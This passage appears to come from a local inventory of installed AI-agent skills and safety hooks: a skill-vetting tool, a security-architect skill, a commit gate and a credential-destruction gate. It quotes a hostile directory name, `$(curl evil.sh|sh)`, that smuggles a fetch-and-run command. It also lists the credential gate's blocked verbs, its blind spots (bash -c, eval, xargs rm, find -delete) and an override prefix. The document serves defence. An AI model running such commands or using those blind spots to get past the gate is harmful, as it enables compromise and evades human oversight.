author is not the judge", "hunt mode") do not exist in the local caches and were
retargeted to local wording rather than shipped dangling. Any future re-port from
upstream must redo this mapping against the live files, never from this row — the local
section numbers move (delegation-and-review has already gained a §8 upstream lacks).
Ships three in-body `unprobed` markers (two-remedies cross-check, baseline
classification, runtime-state adjudication) — these are upstream's contributor-reported
rules, not locally verified; do not cite them as measured here. The repo-relative
provenance paths in the file (`reviews/…`, PR #30/#32, commit SHAs) are opus-pack, not
this machine.

## `~/.claude/skills/skill-vetting/SKILL.md` + `~/.local/share/opus-pack/skill_snapshot.py`

**Edit permission (authoritative copy in §1):** YES wording; NO verdict semantics

INSTALLED 2026-07-27, port of opus-pack `9ac61e1` (326→341 lines local). DRIVER over
`operational-rigor §2` + `references/install-gate.md` — that file is canonical and WINS
on any disagreement; this one only turns it into a runnable procedure. Retargeted at
install: upstream skill-authoring §5 → local §3, upstream §6 → local §2;
operational-rigor §2/§4, delegation-and-review §7, skill-authoring §1,
cross-model-review §6 all verified to resolve unchanged. **The digest tool is
deliberately at `~/.local/share/opus-pack/`, NOT in `~/.claude/`** — §3 requires running
it from a trusted copy OUTSIDE the tree being vetted, and `~/.claude/skills/` is exactly
a tree that gets vetted; do not "tidy" it into `~/.claude/hooks/`. Set
`TOOL=~/.local/share/opus-pack/skill_snapshot.py` for every §3 command. Run-verified at
install 2026-07-27: its own 100-test suite passes (1 skipped), `digest` on a real
candidate exits 0 with a digest, a missing path exits 3 with a `root` anomaly
(fail-closed both arms). Re-run `python3 test-skill_snapshot.py` after ANY edit to the
tool. NOT installed: the §5 companion advisory hook (`skill-vetting-advisory.py`) — it
ships unregistered upstream by design and registering it is a `settings.json` change
needing user sign-off. KNOWN UNFIXED HAZARD carried verbatim from upstream (§3): a
candidate's DIRECTORY NAME is attacker-chosen and `$`, backtick, backslash and `"`
survive double-quoting, so a name like `$(curl evil.sh\|sh)` executes before you read a
byte — a name that is not `[A-Za-z0-9][A-Za-z0-9._-]*` goes in NO shell command at all,
record BLOCK. Ships `unprobed`.

## `~/.claude/skills/security-architect/SKILL.md`

**Edit permission (authoritative copy in §1):** YES wording; NO severity ladder

INSTALLED 2026-07-27, port of opus-pack `9ac61e1` (393→403 lines local). One retarget:
upstream delegation-and-review §2 (dispatch packet) → local §3; operational-rigor §3 and
delegation-and-review §7 verified unchanged. Installed WHOLE rather than folding its
five earned agent-side rules into operational-rigor — the body only loads on trigger,
and extracting would re-author them away from their provenance. The
load-bearing-for-this-machine part is the AI-agent/MCP half (capability triangle;
prompt-guardrail-is-not-an-enforced-control + denial-of-wallet needing a cumulative
budget AND an iteration cap, not a per-action cap; log-sink→model-context amplification
with abort-don't-degrade; MCP stdio has no transport timeout of its own; the L0–L4 grant
ladder) plus secure-ingestion and spend/abuse bounds — that is what makes it worth its
size next to the commodity OWASP/platform two-thirds. TWO rules ship `unprobed`
(capability triangle, guardrail/denial-of-wallet) — never cite either as measured. Its
per-platform secret-storage table is capability-NEGATIVE content, the class
skill-authoring §2 says rots silent (upstream already had to fix
`EncryptedSharedPreferences`): re-verify yearly, and re-probe before acting on any
"platform X can't do Y" line.

## `~/.claude/hooks/gate-before-commit.sh` + `~/.claude/hooks/parse-commit-command.py` (+ its PreToolUse/Bash entry in `settings.json`)

**Edit permission (authoritative copy in §1):** YES script; ASK USER to remove/disable

Blocks `git commit` while the TARGET repo's `checks/run-all.sh` is red; inert in repos
without gates. Adopted 2026-07-07 from opus-pack (upstream `F-e-u-e-r/opus-pack`, fork
`firaen22/opus-pack` main — merged there 2026-07-07, `a8ef21f`). Re-verify after ANY
edit: `bash ~/.claude/hooks/test-gate-before-commit.sh` (34 paths, expected exits
printed inline). Round 3 (2026-07-07, after a fresh-context adversarial review returned
FIX-FIRST on round 2 — see LESSONS.md): commit detection and target-repo resolution now
run on Python `shlex` tokens (quote-aware, no code execution) instead of sed/grep
substring heuristics, requires `python3` (degrades the same way as missing `jq`).
Requires BOTH files present — the `.py` is not optional. Upstream PRs:
F-e-u-e-r/opus-pack #2 (this hook), #1 (cost-asymmetric golden gate, unrelated). Known
false negative (inherent): a commit inside `bash script.sh` bypasses the hook. Known
false POSITIVE (2026-07-11): the parser treats shell variables as inert text, so `git -C
"$VAR" commit` resolves the target dir to the literal string `$VAR`, fails the dir
check, and silently falls back to $CLAUDE_PROJECT_DIR's gates — write the absolute path
LITERALLY in any command containing a commit, never via a variable.

## `~/.claude/hooks/gate-credential-destruction.py` (+ its PreToolUse/Bash entry in `settings.json`, second in the array after gate-before-commit)

**Edit permission (authoritative copy in §1):** YES script; ASK USER to remove/disable

Blocks destructive verbs (rm/unlink/shred/srm/truncate, git rm, incl. sudo/env/etc.
wrappers and if/for/while control-syntax prefixes) against credential-pattern paths (ssh
keys, .env, .pem/.key/etc., .ssh/.aws/.gnupg trees). Adopted 2026-07-10 from opus-pack
PR #11 after full install gate; **re-installed 2026-07-11 with PR #13's bypass fixes**
(control-syntax command position, `--` end-of-options, secret.pub hole); **re-installed
2026-07-13 with PR #24's hardening** (fail-open→degraded-raw-scan on
malformed/internal-error envelopes so a malformed envelope carrying a destructive
command can't slip; oversized >1 MiB envelope blocked unread; now 291 lines) —
re-verified via 50/50 fixtures + direct fail-open-vuln repro (old exit 0 → new exit 2) +
live in-session block. Re-run `bash ~/.claude/hooks/test-gate-credential-destruction.sh`
after ANY edit, and re-gate on any upstream update (a passed gate certifies the version
read, not the path). NB the hook is an **accidental-destruction gate, NOT a security
boundary** (newline-separated commands, bash -c/eval, redirect/var indirection are NOT
caught — real protection is filesystem isolation). Override: `CRED_GATE_APPROVED=1`
prefix, one command only, logged. Known false positive: it text-scans heredoc bodies, so
documentation QUOTING a destructive-command example trips it — write such docs via
Write/Edit, not Bash heredocs. Blind spots (inherent): xargs rm, find -delete, `>`
truncation, Write/Edit overwrites.
